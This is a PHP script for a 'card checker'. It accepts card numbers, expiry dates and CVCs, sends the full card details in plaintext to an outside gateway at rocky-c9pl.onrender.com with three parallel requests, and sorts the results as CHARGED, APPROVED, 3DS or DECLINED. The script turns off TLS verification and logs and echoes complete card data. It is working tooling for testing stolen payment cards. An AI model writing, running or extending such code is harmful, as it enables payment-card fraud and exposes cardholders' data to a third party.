<?php
header('Content-Type: text/plain');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging (disable in production)
 $log_file = __DIR__ . '/b37$_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to map API response to our status
function mapStatus($apiStatus, $apiResponse) {
    $apiStatus = strtolower($apiStatus);
    $apiResponse = strtolower($apiResponse);
    
    if (strpos($apiResponse, 'charged') !== false || $apiStatus === 'charged') {
        return 'CHARGED';
    } elseif (strpos($apiResponse, 'approved') !== false || $apiStatus === 'approved') {
        return 'APPROVED';
    } elseif (strpos($apiResponse, '3d') !== false || strpos($apiResponse, 'authentication') !== false) {
        return '3DS';
    } else {
        return 'DECLINED';
    }
}

// Function to check a single card via b37$ API with 3 parallel requests
function checkCard($card_number, $exp_month, $exp_year, $cvc) {
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($card_details);
    $api_url = "https://rocky-c9pl.onrender.com/gateway=b3$/cc=" . $encoded_cc;
    log_message("Checking card: $card_details, URL: $api_url");

    // Create 3 cURL handles for parallel requests
    $handles = [];
    $mh = curl_multi_init();
    
    for ($i = 0; $i < 3; $i++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, []);
        
        $handles[$i] = $ch;
        curl_multi_add_handle($mh, $ch);
    }
    
    // Execute the parallel requests
    $active = null;
    do {
        $status = curl_multi_exec($mh, $active);
        if ($active) {
            curl_multi_select($mh);
        }
    } while ($active && $status == CURLM_OK);
    
    // Collect the responses
    $responses = [];
    $http_codes = [];
    $curl_errors = [];
    
    foreach ($handles as $i => $ch) {
        $response = curl_multi_getcontent($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        
        $responses[] = $response;
        $http_codes[] = $http_code;
        $curl_errors[] = $curl_error;
        
        log_message("Request " . ($i + 1) . " for $card_details: HTTP $http_code, Error: $curl_error, Response: " . substr($response, 0, 100));
        
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    
    curl_multi_close($mh);
    
    // Process responses and determine final status
    $decoded_responses = [];
    $statuses = [];
    $response_texts = [];
    
    foreach ($responses as $i => $response) {
        if ($response === false || $http_codes[$i] !== 200 || !empty($curl_errors[$i])) {
            $decoded_responses[] = [
                'status' => 'Error',
                'response' => "Request failed: {$curl_errors[$i]} (HTTP {$http_codes[$i]})"
            ];
            continue;
        }
        
        $result = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
            $decoded_responses[] = [
                'status' => 'Error',
                'response' => "Invalid JSON: " . substr($response, 0, 100)
            ];
            continue;
        }
        
        $decoded_responses[] = $result;
    }
    
    // Map responses to our statuses
    foreach ($decoded_responses as $resp) {
        $status = mapStatus($resp['status'], $resp['response']);
        $statuses[] = $status;
        $response_texts[] = $resp['response'];
    }
    
    // Determine final status (prioritize CHARGED > APPROVED > 3DS > DECLINED)
    if (in_array('CHARGED', $statuses)) {
        $final_status = 'CHARGED';
        $final_response = $response_texts[array_search('CHARGED', $statuses)];
    } elseif (in_array('APPROVED', $statuses)) {
        $final_status = 'APPROVED';
        $final_response = $response_texts[array_search('APPROVED', $statuses)];
    } elseif (in_array('3DS', $statuses)) {
        $final_status = '3DS';
        $final_response = $response_texts[array_search('3DS', $statuses)];
    } else {
        $final_status = 'DECLINED';
        // Use the first response if all are declined
        $final_response = $response_texts[0] ?? 'No valid response';
    }
    
    $final_response = htmlspecialchars($final_response, ENT_QUOTES, 'UTF-8');
    log_message("Final status for $card_details: $final_status - $final_response");
    
    return "$final_status [$final_response] $card_details";
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
    log_message("Invalid request or missing card data");
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

 $card = $_POST['card'];
 $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate card data
foreach ($required_fields as $field) {
    if (empty($card[$field])) {
        log_message("Missing $field");
        echo "DECLINED [Missing $field]";
        exit;
    }
}

// Sanitize inputs
 $card_number = preg_replace('/[^0-9]/', '', $card['number']);
 $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
 $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
 $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

// Normalize exp_month to 2 digits
 $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
    log_message("Invalid exp_month format: $exp_month_raw");
    echo "DECLINED [Invalid exp_month format]";
    exit;
}

// Normalize exp_year to 4 digits
if (strlen($exp_year_raw) == 2) {
    $current_year = (int) date('y');
    $current_century = (int) (date('Y') - $current_year);
    $card_year = (int) $exp_year_raw;
    $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
} elseif (strlen($exp_year_raw) == 4) {
    $exp_year = (int) $exp_year_raw;
} else {
    log_message("Invalid exp_year format: $exp_year_raw");
    echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
    exit;
}

// Validate card number, year, and CVC
if (!preg_match('/^\d{13,19}$/', $card_number)) {
    log_message("Invalid card number format: $card_number");
    echo "DECLINED [Invalid card number format]";
    exit;
}
if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
    log_message("Invalid exp_year after normalization: $exp_year");
    echo "DECLINED [Invalid exp_year format or too far in future]";
    exit;
}
if (!preg_match('/^\d{3,4}$/', $cvc)) {
    log_message("Invalid CVC format: $cvc");
    echo "DECLINED [Invalid CVC format]";
    exit;
}

// Validate logical expiry
 $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
 $current_timestamp = strtotime('first day of this month');
if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
    log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
    echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc";
    exit;
}

// Check single card with 3 parallel requests
echo checkCard($card_number, $exp_month, $exp_year, $cvc);
?>
